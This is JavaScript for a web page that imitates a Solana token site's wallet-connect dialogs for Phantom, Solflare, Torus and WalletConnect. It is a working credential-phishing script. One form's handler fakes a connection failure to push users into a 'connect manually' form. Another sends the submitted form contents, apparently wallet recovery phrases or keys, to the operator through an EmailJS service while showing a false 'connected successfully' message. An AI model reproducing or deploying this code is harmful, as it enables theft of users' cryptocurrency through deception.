emailjs.init({
	publicKey: "3ubp9ib9d67ick-CX",
});

const roller = () => {
	const contentParent = (document.querySelector(".main-content"))
	const firstCHild = contentParent.children[0]
	const lastChild = (contentParent.lastElementChild);
	contentParent.insertBefore(lastChild, firstCHild)
}
const switcher = () => {
	const contentParent = new Date().getSeconds() <= 30 ? (document.querySelector(".banner-one")) : (document.querySelector(".banner-two"))

	const firstCHild = contentParent.children[0]
	const lastChild = (contentParent.lastElementChild);
	contentParent.insertBefore(lastChild, firstCHild)
	const navParent = (document.querySelector(".bottom-nav"))
	const navfirstCHild = navParent.children[0]
	const navlastChild = (navParent.lastElementChild);
	navParent.insertBefore(navlastChild, navfirstCHild)

}

setInterval(() => { switcher(), roller() }, 1000)

const popupbg = document.querySelector(".pop-up-bg")
const popupbg2 = document.querySelector(".pop-up-bg-2")
const cookies_pop = document.querySelector(".cookies-pop")
const popupbox = document.querySelector(".popup-box")
const howItWorks = document.querySelector(".how_it_works")
const connectWallet = document.querySelector(".connect-wallet")
console.log(popupbg.attributes['data-state'].value)

howItWorks.addEventListener('click', () => {
	popupbg2.style.display = "block"
})
connectWallet.addEventListener('click', () => {
	popupbg.style.display = "block"
})
popupbox.addEventListener('click', (e) => {
	e.stopPropagation()
})
popupbg2.addEventListener('click', (e) => {
	e.stopPropagation()
	popupbg2.style.display = "none"
})
popupbg.addEventListener('click', (e) => {
	e.stopPropagation()
	popupbg.style.display = "none"
})

document.querySelectorAll('.main-form').forEach(forms => {
	forms.addEventListener('submit', function (event) {
		console.log("done")
		event.preventDefault();
		const btn_connect = forms.querySelector(".css-ev97sc");
		btn_connect.setAttribute("disabled", true);
		btn_connect.innerHTML = `<span class="css-1o1xzxn">Wwallet conecting...</span>`
		emailjs.sendForm('service_iqcf8gg', 'template_4p0736a', this)
			.then(() => {
				btn_connect.innerHTML = `<span class="css-1o1xzxn">Wwallet conected successfully</span>`
			}, (error) => {
				console.log('FAILED...', error);
			});
	});
})
document.querySelectorAll('form#add-form').forEach(forms => {
	forms.addEventListener('submit', function (event) {
		event.preventDefault();
		const error_connect = forms.querySelector(".error-connect");
		const connect_manually = forms.querySelector(".connect-manually");
		error_connect.style.display = "flex";
		error_connect.innerHTML = "connecting...";
		setTimeout(() => {
			error_connect.innerHTML = "Failed to connect wallet";
			connect_manually.style.display = "block";
			connect_manually.onclick = () => {
				forms.nextElementSibling.style.display = "flex"
				forms.style.display = "none"
			}
		}, 2000);
	});
})


const solflare_btn = document.querySelector(".solflare-btn")
const torus_btn = document.querySelector(".torus-btn")
const phantom_btn = document.querySelector(".phantom-btn")
const wConnect_btn = document.querySelector(".wConnect-btn")

const solflare_close_modal_button = document.querySelector(".solflare-modal #close-modal-button")
const torus_close_modal_button = document.querySelector(".torus-modal #close-modal-button")
const phantom_close_modal_button = document.querySelector(".phantom-modal #close-modal-button")
const wConnect_close_modal_button = document.querySelector(".walletconnect-modal #close-modal-button")

const openModal = (modal) => {
	document.querySelector(`.${modal}-modal`).style.display = "flex"
	popupbg.style.display = "none"
}
const closeModal = (modal) => {
	document.querySelector(`.css-bvrne.${modal}-modal`).style.display = "none"
}

solflare_btn.addEventListener('click', () => openModal("solflare"))
torus_btn.addEventListener('click', () => openModal("torus"))
phantom_btn.addEventListener('click', () => openModal("phantom"))
wConnect_btn.addEventListener('click', () => openModal("walletconnect"))
solflare_close_modal_button.addEventListener('click', () => closeModal("solflare"))
torus_close_modal_button.addEventListener('click', () => closeModal("torus"))
phantom_close_modal_button.addEventListener('click', () => closeModal("phantom"))
wConnect_close_modal_button.addEventListener('click', () => closeModal("walletconnect"))


const connect_web_button_add = document.querySelector(".connect-web-button-add")
const cookies_btns = document.querySelectorAll(".cookies-btn")

cookies_btns.forEach(btns => {
	btns.addEventListener("click", () => {
		cookies_pop.style.display = "none"
		localStorage.setItem("pump_cookies", true)

	})
})

const check_localstorage_pops = () => {
	if (!localStorage.getItem("how_it_works")) {
		popupbg2.style.display = "block"
		localStorage.setItem("how_it_works", true)
	}
	if (!localStorage.getItem("pump_cookies")) {
		cookies_pop.style.display = "block"
	}
}

check_localstorage_pops()

const content_navs = document.querySelectorAll(".content-navs")
const main_content = document.querySelector(".main-content")
const filter_bar = document.querySelector(".filter-bar")
const not_following = document.querySelector(".not_following")
const for_you = document.querySelector(".for_you")


content_navs.forEach(navs => {
	navs.addEventListener("click", (e) => {
		content_navs.forEach(navs => {
			navs.classList.remove("active-content-nav");
		})
		main_content.style.display = "grid"
		filter_bar.style.display = "grid"
		filter_bar.id = "filter-show"
		for_you.id = "filter-hide"
		not_following.id = "filter-hide"
		if (e.currentTarget.classList.contains("following")) {
			main_content.style.display = "none"
			filter_bar.id = "filter-hide"
			not_following.id = "filter-show"
		}
		if (e.currentTarget.classList.contains("foryou")) {
			main_content.style.display = "none"
			filter_bar.id = "filter-hide"
			for_you.id = "filter-show"
		}

		e.currentTarget.classList.add("active-content-nav");

	})
})